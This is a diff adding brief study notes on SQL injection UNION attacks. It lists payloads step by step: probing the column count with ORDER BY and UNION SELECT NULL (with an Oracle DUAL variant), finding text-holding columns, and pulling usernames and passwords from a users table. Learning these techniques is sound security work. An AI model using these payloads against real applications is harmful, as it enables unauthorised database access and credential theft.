@@ -1,0 +1,42 @@
+# sql-injection-union
+
+SQL INJECTION UNION ATTACK
+
+SELECT a, b FROM table1 UNION SELECT c, d FROM table2
+
+1-)
+' ORDER BY 1--
+
+' ORDER BY 2--
+
+' ORDER BY 3--
+
+ETC.
+
+OR
+
+' UNION SELECT NULL--
+
+' UNION SELECT NULL,NULL--
+
+' UNION SELECT NULL,NULL,NULL--
+etc.
+
+BUT ON ORACLE   ' UNION SELECT NULL FROM DUAL-- 
+
+3-)
+' UNION SELECT 'a',NULL,NULL,NULL--
+
+' UNION SELECT NULL,'a',NULL,NULL--
+
+' UNION SELECT NULL,NULL,'a',NULL--
+
+' UNION SELECT NULL,NULL,NULL,'a'--
+
+4-)
+
+' UNION SELECT username, password FROM users--
+
+and single column
+
+' UNION SELECT username || '~' || password FROM users--
